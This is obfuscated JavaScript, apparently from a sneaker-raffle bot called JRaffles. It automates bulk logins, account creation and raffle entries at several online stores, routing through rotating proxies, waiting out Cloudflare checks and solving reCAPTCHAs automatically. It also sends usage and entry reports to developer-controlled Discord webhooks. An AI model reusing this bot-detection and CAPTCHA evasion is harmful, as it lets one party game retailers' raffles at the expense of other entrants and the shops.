        await _0x38b36b(_0x2e4f2a, _0x87d2e1), _0x4bfd08(_0x4b52aa['name'] + '\x20Task\x20' + (_0x87d2e1 + 0x1) + '\x20/\x20' + _0x2e4f2a['length'] + '\x20||\x20File:\x20' + _0x493993 + '\x20Proxies:\x20' + _0x42a4ad);
        const _0x329d70 = 'https://www.fenom.com/en/authentication?create_account=1';
        var _0xf856b5 = Math['round'](Math['random']() * (_0x27fc29['length'] - 0x1)), _0x5d5f19 = _0x27fc29[_0xf856b5]['split'](':'), _0x26f1b3;
        try {
            _0x26f1b3 = await _0x168014['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x5d5f19[0x0] + ':' + _0x5d5f19[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        } catch {
            _0x26f1b3 = await _0x168014['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x5d5f19[0x0] + ':' + _0x5d5f19[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        }
        try {
            const _0x4ef3e7 = await _0x26f1b3['newPage'](), _0x5e5b6d = await _0x4ef3e7['target']()['createCDPSession'](), { windowId: _0x1c808c } = await _0x5e5b6d['send']('Browser.getWindowForTarget');
            await _0x4ef3e7['authenticate']({
                'username': '' + _0x5d5f19[0x2],
                'password': '' + _0x5d5f19[0x3]
            }), console['log'](_0x57a400() + '\x20[' + _0x4b52aa['name'] + ']\x20Task\x20' + (_0x87d2e1 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4ef3e7['goto']('https://www.fenom.com/en/authentication'), console['log'](_0x57a400() + '\x20[' + _0x4b52aa['name'] + ']\x20Task\x20' + (_0x87d2e1 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x5e5b6d['send']('Browser.setWindowBounds', {
                'windowId': _0x1c808c,
                'bounds': { 'windowState': 'minimized' }
            }), await _0x4f800b(0x1f40);
            try {
                await _0x4ef3e7['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
            } catch {
                throw new Error('Blocked\x20by\x20cloudflare');
            }
            await _0x4f800b(0x1388), console['log'](_0x57a400() + '\x20[' + _0x4b52aa['name'] + ']\x20Task\x20' + (_0x87d2e1 + 0x1) + '\x20:\x20Logging\x20in'), await _0x4ef3e7['type']('input[name=\x22email\x22]', '' + _0x2e4f2a[_0x87d2e1]['Email']), await _0x4f800b(0x1f4), await _0x4ef3e7['type']('input[name=\x22password\x22]', '' + _0x2e4f2a[_0x87d2e1]['Password']), await _0x4f800b(0x258), await _0x4ef3e7['$eval']('#login-form', _0x35021d => _0x35021d['submit']()), await _0x4ef3e7['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x4f800b(0x1f4), await _0x4ef3e7['goto']('' + _0x2e4f2a[_0x87d2e1]['Url']), await _0x4ef3e7['waitForSelector']('#group_2'), console['log'](_0x57a400() + '\x20[' + _0x4b52aa['name'] + ']\x20Task\x20' + (_0x87d2e1 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x2e4f2a[_0x87d2e1]['Size']);
            if (_0x2e4f2a[_0x87d2e1]['Size'] != 'RANDOM') {
                var _0x24d07d = '\x20' + _0x2e4f2a[_0x87d2e1]['Size'] + '\x20';
                const _0x3bfbe1 = await _0x4ef3e7['$x']('//span[contains(text(),\x20' + _0x24d07d + ')]');
                await _0x3bfbe1[0x0]['click']();
            } else {
                const _0x528a56 = await _0x4ef3e7['$$']('#group_2\x20>\x20li');
                var _0xffce4a = Math['round'](Math['random']() * (_0x528a56['length'] - 0x1));
                await _0x528a56[_0xffce4a]['click']();
            }
            await _0x4f800b(0x258), await _0x4ef3e7['click']('#cookieChoiceDismiss'), await _0x4f800b(0x3e8), await _0x4ef3e7['type']('#instagram-account', '' + _0x2e4f2a[_0x87d2e1]['Follower']), await _0x4f800b(0x28a), await _0x4ef3e7['click']('#book-btn'), await _0x4f800b(0xbb8), await _0x4ef3e7['waitForSelector']('#recaptcha-container'), await _0x4f800b(0x1f4), console['log'](_0x57a400() + '\x20[' + _0x4b52aa['name'] + ']\x20Task\x20' + (_0x87d2e1 + 0x1) + '\x20:\x20' + _0x41434e['cyan']('Solving\x20Captcha')), await _0x4ef3e7['solveRecaptchas'](), console['log'](_0x57a400() + '\x20[' + _0x4b52aa['name'] + ']\x20Task\x20' + (_0x87d2e1 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x4f800b(0x7d0), await _0x4ef3e7['$eval']('#book-btn-for-sure', _0x545e4b => _0x545e4b['click']()), await _0x4f800b(0x12c), await _0x4ef3e7['click']('#book-btn-for-sure'), await _0x4f800b(0xdac);
            const _0x8f342c = await _0x4ef3e7['$eval']('.reservation-popup\x20>\x20.title', _0x32d704 => {
                return _0x32d704['innerHTML'];
            });
            if (_0x8f342c) {
                console['log'](_0x41434e['green'](_0x57a400() + '\x20[' + _0x4b52aa['name'] + ']\x20Task\x20' + (_0x87d2e1 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                var _0x4cd554 = await _0xff2c9f(_0x2e4f2a[_0x87d2e1], _0x4b52aa, 'dev', ![]), _0xda1c0 = await _0xff2c9f(_0x2e4f2a[_0x87d2e1], _0x4b52aa, 'pub', ![]);
                const _0x3fd782 = {
                    'succesDEVMSG': { 'embeds': [_0x4cd554] },
                    'succesPUBMSG': { 'embeds': [_0xda1c0] }
                };
                try {
                    _0xd30cf5['webhook'] != undefined && _0xd30cf5['webhook'] != '' && await _0x5f2c92(_0xd30cf5['webhook'], _0x3fd782['succesDEVMSG']), await _0x4f800b(0xc8), await _0x5f2c92(_0x45c968, _0x3fd782['succesDEVMSG']), await _0x4f800b(0xc8), await _0x5f2c92(_0x302219, _0x3fd782['succesPUBMSG']);
                } catch (_0x3b8394) {
                    console['log'](_0x41434e['yellow'](_0x57a400() + '\x20[' + _0x4b52aa['name'] + ']\x20Task\x20' + (_0x87d2e1 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x3b8394));
                }
            } else
                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
        } catch (_0x571511) {
            console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x4b52aa['name'] + ']\x20Task\x20' + (_0x87d2e1 + 0x1) + '\x20:\x20' + _0x571511)), _0x1bf89e = '' + _0x571511;
            var _0x51e8de = await _0xff2c9f(_0x2e4f2a[_0x87d2e1], _0x4b52aa, 'dev', !![], _0x1bf89e), _0x4cd554 = await _0xff2c9f(_0x2e4f2a[_0x87d2e1], _0x4b52aa, 'dev', ![]), _0xda1c0 = await _0xff2c9f(_0x2e4f2a[_0x87d2e1], _0x4b52aa, 'pub', ![]);
            const _0x4c24cb = {
                'succesDEVMSG': { 'embeds': [_0x4cd554] },
                'succesPUBMSG': { 'embeds': [_0xda1c0] }
            };
            _0x4c24cb['errorDEV'] = { 'embeds': [_0x51e8de] }, _0xd30cf5['webhook'] != undefined && _0xd30cf5['webhook'] != '' && await _0x5f2c92(_0xd30cf5['webhook'], _0x4c24cb['errorDEV']), await _0x5f2c92(_0x3afc50, _0x4c24cb['errorDEV']), _0x571511 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x179d82 = 'yes');
        } finally {
            _0x26f1b3['close']();
            if (_0x179d82 == 'yes' && _0x1c44cf != 0x5 && _0x1bf89e != 'Size\x20Not\x20Found') {
                console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x4b52aa['name'] + ']\x20Task\x20' + (_0x87d2e1 + 0x1) + '\x20:\x20Retrying')), _0x87d2e1 = _0x87d2e1 - 0x1, _0x1c44cf = _0x1c44cf + 0x1;
                continue;
            }
            console['log'](_0x57a400() + '\x20[' + _0x4b52aa['name'] + ']\x20Waiting\x20for\x20' + _0xd30cf5['delay'] + '\x20ms'), await _0x4f800b(_0xd30cf5['delay']);
        }
    }
}
async function _0x227f3e() {
    await _0xa2535b(), console['clear']();
    if (_0x26b8e9 != 'devkey') {
        let _0x598d57 = await _0x273643['autoUpdate']();
        if (_0x598d57 === 'yes')
            return _0x2a8159('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x39687a == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x4f800b(0x2710);
        ;
    }
    await _0x532d54(_0x39687a);
    if (_0x3c0d2d === ![])
        return console['log']('Closing\x20Browser'), await _0x4f800b(0xbb8);
    else
        try {
            var _0x54ac1f = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x434d06
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x26b8e9
                    }
                ]
            }];
            const _0x4da3e5 = { 'embeds': _0x54ac1f };
            var _0x4aa008 = await _0xff2c9f(null, null, 'open', ![]);
            const _0x386206 = { 'openDEVMSG': { 'embeds': [_0x4aa008] } };
            await _0x5f2c92(_0x3ff8ce, _0x386206['openDEVMSG']);
            async function _0x234b05() {
                _0x4bfd08('JRaffles\x20' + _0x26b8e9), console['clear'](), console['log']('Welcome\x20to\x20' + _0x41434e['cyan']('JRaffles();') + '\x20' + _0x26b8e9), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x23c57d = 0x0; _0x23c57d < _0x388f09['length'] - 0x3; _0x23c57d++) {
                    if (_0x388f09[_0x23c57d]['name'] === 'Reload\x20Settings' || _0x388f09[_0x23c57d]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x23c57d + ')\x20[' + _0x388f09[_0x23c57d]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x388f09['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x388f09['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x388f09['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x29301a();
                if (taskModule > _0x388f09['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x4f800b(0x3e8), _0x234b05();
                if (_0x388f09[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x4c3b5d(_0x388f09[taskModule]['modules']);
                    var _0x243c83 = _0x388f09[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x2) {
                        var _0x269d68 = await _0x12f1e3(), _0x23ff9b = await _0x5d0688();
                        await _0x548eec(_0x23ff9b, _0x269d68, _0x243c83);
                    } else {
                        if (taskFunction == 0x0) {
                            var _0x269d68 = await _0x12f1e3(), _0x23ff9b = await _0x5d0688();
                            await _0x5e017b(_0x23ff9b, _0x269d68, _0x243c83);
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x269d68 = await _0x12f1e3(), _0x552648 = await _0x20de83(), _0x46b3ce = _0x552648['split'](';');
                                await _0x1e096c(_0x46b3ce, _0x269d68, _0x243c83);
                            }
                        }
                    }
                    return _0x234b05();
                }
                if (_0x388f09[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x4c3b5d(_0x388f09[taskModule]['modules']);
                        var _0x243c83 = _0x388f09[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x269d68 = await _0x12f1e3(), _0x53093a = await _0x5d0688();
                            await _0x107a68(_0x53093a, _0x269d68, _0x243c83);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x269d68 = await _0x12f1e3(), _0x53093a = await _0x5d0688();
                                await _0x3edde8(_0x53093a, _0x269d68, _0x243c83);
                            }
                        }
                    } catch (_0x47a681) {
                        console['log'](_0x47a681), await _0x4f800b(0xfa0);
                    }
                    return _0x234b05();
                }
                if (_0x388f09[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x4c3b5d(_0x388f09[taskModule]['modules']);
                    var _0x243c83 = _0x388f09[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x269d68 = await _0x12f1e3(), _0x3750f8 = await _0x5d0688();
                    if (_0x3750f8[0x0]['Url'] == '' || _0x3750f8[0x0]['Url'] == undefined) {
                        await _0x179ca7(_0x269d68);
                        var _0x243d78 = await _0x2755db();
                        return await afewFunction('' + _0x2fd131[_0x243d78], 'nor', _0x243c83, _0x3750f8, _0x269d68), _0x234b05();
                    }
                    return await afewFunction(_0x3750f8[0x0]['Url'], 'nor', _0x243c83, _0x3750f8, _0x269d68), _0x234b05();
                } else {
                    if (_0x388f09[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x4c3b5d(_0x388f09[taskModule]['modules']);
                        var _0x243c83 = _0x388f09[taskModule]['modules'][taskFunction];
                        if (taskFunction == 0x0) {
                            var _0x269d68 = await _0x12f1e3(), _0x3f629c = await _0x5d0688();
                            console['log']('Starting\x20' + _0x3f629c['length'] + '\x20MAHA\x20Tasks');
                            for (var _0x201f8e = 0x0; _0x201f8e < _0x3f629c['length']; _0x201f8e++) {
                                console['log'](_0x57a400() + '\x20[' + _0x243c83['name'] + ']\x20Task\x20' + (_0x201f8e + 0x1) + ':\x20Getting\x20Session');
                                try {
                                    await _0x498969(_0x201f8e, 'nor', _0x243c83, _0x3f629c, _0x269d68), console['log'](_0x57a400() + '\x20[' + _0x243c83['name'] + ']\x20Sleeping\x20for\x20' + _0xd30cf5['MahaDelay'] + '\x20ms'), await _0x4f800b(_0xd30cf5['MahaDelay']);
                                } catch (_0x142e95) {
                                    console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x243c83['name'] + ']\x20Task\x20' + (_0x201f8e + 0x1) + ':\x20Error\x20' + _0x142e95));
                                }
                            }
                            ;
                            return _0x234b05();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x269d68 = await _0x12f1e3();
                                console['log']('Use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20copy\x20your\x20links\x20here..'), _0x552648 = await _0x20de83(), _0x46b3ce = _0x552648['split'](';'), console['log'](_0x46b3ce['length'] + '\x20links\x20found!'), console['log']('Starting\x20verification..');
                                for (var _0x201f8e = 0x0; _0x201f8e < _0x46b3ce['length']; _0x201f8e++) {
                                    _0x243c83['url'] = _0x46b3ce[_0x201f8e], console['log'](_0x57a400() + '\x20[' + _0x243c83['name'] + ']\x20Task\x20' + (_0x201f8e + 0x1) + ':\x20Getting\x20Session');
                                    try {
                                        await _0x498969(_0x201f8e, 'ver', _0x243c83, _0x3f629c, _0x269d68), console['log'](_0x57a400() + '\x20[' + _0x243c83['name'] + ']\x20Sleeping\x20for\x20' + _0xd30cf5['verificationDelay'] + '\x20ms'), await _0x4f800b(_0xd30cf5['verificationDelay']);
                                    } catch (_0x5ce17a) {
                                        console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x243c83['name'] + ']\x20Task\x20' + (_0x201f8e + 0x1) + ':\x20Error\x20' + _0x5ce17a));
                                    }
                                }
                                ;
                                return _0x234b05();
                            }
                        }
                    } else {
                        if (_0x388f09[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x4c3b5d(_0x388f09[taskModule]['modules']);
                            var _0x243c83 = _0x388f09[taskModule]['modules'][taskFunction], _0x269d68 = await _0x12f1e3(), _0x30fd25 = await _0x5d0688();
                            return await _0x4b4369(_0x30fd25, _0x269d68, _0x243c83), await _0x4f800b(0x1388), _0x234b05();
                        } else {
                            if (_0x388f09[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x4c3b5d(_0x388f09[taskModule]['modules']);
                                var _0x243c83 = _0x388f09[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x269d68 = await _0x12f1e3(), _0x8a7b48 = await _0x5d0688();
                                    console['log']('Starting\x20' + _0x41434e['yellow']('OQIUM') + '\x20Tasks');
                                    for (var _0x201f8e = 0x0; _0x201f8e < _0x8a7b48['length']; _0x201f8e++) {
                                        console['log'](_0x57a400() + '\x20[' + _0x243c83['name'] + ']\x20Task\x20' + (_0x201f8e + 0x1) + ':\x20Getting\x20Session');
                                        try {
                                            await _0x4e1355(_0x201f8e, 'nor', _0x243c83, _0x8a7b48, _0x269d68);
                                        } catch (_0x1fd252) {
                                            console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x243c83['name'] + ']\x20Task\x20' + (_0x201f8e + 0x1) + ':\x20Task\x20failed\x20' + _0x1fd252));
                                        }
                                        console['log'](_0x57a400() + '\x20[' + _0x243c83['name'] + ']\x20Sleeping\x20for\x20' + _0xd30cf5['delay'] + '\x20ms'), await _0x4f800b(_0xd30cf5['delay']);
                                    }
                                    return _0x234b05();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x269d68 = await _0x12f1e3();
                                        console['log']('Use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20copy\x20your\x20links\x20here..'), _0x552648 = await _0x20de83(), _0x46b3ce = _0x552648['split'](';'), console['log'](_0x46b3ce['length'] + '\x20links\x20found!'), console['log']('Starting\x20verification..');
                                        for (var _0x201f8e = 0x0; _0x201f8e < _0x46b3ce['length']; _0x201f8e++) {
                                            try {
                                                _0x243c83['url'] = _0x46b3ce[_0x201f8e], console['log'](_0x57a400() + '\x20[' + _0x388f09[taskModule]['name'] + ']\x20Task\x20' + (_0x201f8e + 0x1) + ':\x20Getting\x20Session'), await _0x4e1355(_0x201f8e, 'ver', _0x243c83, null, _0x269d68), console['log'](_0x57a400() + '\x20[' + _0x388f09[taskModule]['name'] + ']\x20Sleeping\x20for\x20' + _0xd30cf5['verificationDelay'] + '\x20ms'), await _0x4f800b(_0xd30cf5['verificationDelay']);
                                            } catch (_0x2df3ea) {
                                                console['log'](_0x2df3ea), await _0x4f800b(0x1388);
                                            }
                                            ;
                                        }
                                        ;
                                        return _0x234b05();
                                    }
                                }
                                ;
                            } else {
                                if (_0x388f09[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x4c3b5d(_0x388f09[taskModule]['modules']);
                                    var _0x243c83 = _0x388f09[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await _0x2d0f5f('https://bouncewear.com/nl/account/register', _0x243c83);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x388f09[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x4c3b5d(_0x388f09[taskModule]['modules']);
                                        var _0x243c83 = _0x388f09[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x269d68 = await _0x12f1e3(), _0x4892f1 = await _0x5d0688();
                                            return await _0x47614f('https://patta.nl/account/register', _0x243c83, _0x4892f1, _0x269d68), _0x234b05();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x269d68 = await _0x12f1e3(), _0x4892f1 = await _0x5d0688();
                                                return await _0x10c4e3('', _0x243c83, _0x4892f1, _0x269d68), _0x234b05();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x388f09[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x4c3b5d(_0x388f09[taskModule]['modules']);
                                            var _0x243c83 = _0x388f09[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x269d68 = await _0x12f1e3(), _0x39c55d = await _0x5d0688();
                                                return await _0x4ee861('https://slamjam.nl/account/register', _0x243c83, _0x39c55d, _0x269d68), _0x234b05();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x269d68 = await _0x12f1e3(), _0x39c55d = await _0x5d0688();
                                                    return await _0x4289e7('', _0x243c83, _0x39c55d, _0x269d68), _0x234b05();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x388f09[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x4c3b5d(_0x388f09[taskModule]['modules']);
                                                var _0x243c83 = _0x388f09[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x269d68 = await _0x12f1e3(), _0x47d320 = await _0x5d0688();
                                                    return await _0x1c3e33('https://www.kickz.com/nl/login/', _0x243c83, _0x47d320, _0x269d68), _0x234b05();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x269d68 = await _0x12f1e3(), _0x47d320 = await _0x5d0688();
                                                        return await _0x4a457b(_0x243c83, _0x47d320, _0x269d68), _0x234b05();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x388f09[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x4c3b5d(_0x388f09[taskModule]['modules']);
                                                    var _0x243c83 = _0x388f09[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x269d68 = await _0x12f1e3(), _0x2af71f = await _0x5d0688();
                                                        return await _0x54a85a(_0x243c83, _0x2af71f, _0x269d68), _0x234b05();
                                                    }
                                                } else {
                                                    if (_0x388f09[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x4f800b(0x3e8), _0x234b05();
                                                    else {
                                                        if (_0x388f09[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0xe11cd4 = _0x388f09[taskModule]['name'], _0x269d68 = await _0x12f1e3();
                                                            const _0x489dc9 = await _0x20de83();
                                                            var _0x46b3ce = _0x489dc9['split'](';');
                                                            await _0x72683b(_0x46b3ce, _0xe11cd4, _0x269d68);
                                                        } else {
                                                            if (_0x388f09[taskModule]['name'] == 'Change\x20Settings') {
                                                                console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                var _0x43431f = 0x0;
                                                                for (const _0xf86334 in _0xd30cf5) {
                                                                    console['log']('(' + _0x43431f + ')\x20' + _0xf86334 + '\x20:\x20' + _0xd30cf5[_0xf86334]), _0x43431f++;
                                                                }
                                                                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x43431f + ')\x20Return\x20to\x20Main\x20Menu');
                                                                var _0x409524 = await _0x56fb99();
                                                                if (_0x409524 == _0x43431f)
                                                                    return _0x234b05();
                                                                console['clear'];
                                                                var _0x4db0b3 = 0x0;
                                                                for (var _0x4e1660 in _0xd30cf5) {
                                                                    if (_0x409524 == _0x4db0b3) {
                                                                        console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x4e1660 + '\x20:'), _0xd30cf5[_0x4e1660] = await _0x5ac7ee(), _0x76f3de['writeFileSync']('../settings.json', JSON['stringify'](_0xd30cf5));
                                                                        break;
                                                                    } else
                                                                        _0x4db0b3++;
                                                                }
                                                                return console['log']('Settings\x20Saved!'), await _0x4f800b(0xbb8), _0x234b05();
                                                            } else {
                                                                if (_0x388f09[taskModule]['name'] == 'Reload\x20Settings')
                                                                    return console['log']('Reloading\x20settings'), await _0xa2535b(), _0x234b05();
                                                                else {
                                                                    if (taskModule == 0x45) {
                                                                        _0x388f09[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                        var _0x28af8d = await _0x4f104b();
                                                                        _0x28af8d == 'ModuleVoorDeBoys' ? (await _0x179ca7(), await _0x2755db(), await afewFunction(_0x2fd131[_0x243d78], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x4f800b(0xbb8));
                                                                    } else {
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            await _0x234b05();
        } catch (_0x41de7c) {
            return console['log'](_0x41de7c), await _0x4f800b(0x3a98);
        }
}
;
_0x4bfd08('JRaffles\x20' + _0x26b8e9), _0xa2535b();
try {
    _0x227f3e();
} catch (_0x5a9035) {
    var _0x504c0b = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x434d06
            },
            {
                'name': 'Version',
                'value': '' + _0x26b8e9
            },
            {
                'name': 'Error',
                'value': '' + _0x5a9035
            }
        ]
    }];
    const _0x1f8178 = { 'embeds': _0x504c0b };
    _0x5f2c92(_0x3afc50, _0x1f8178);
}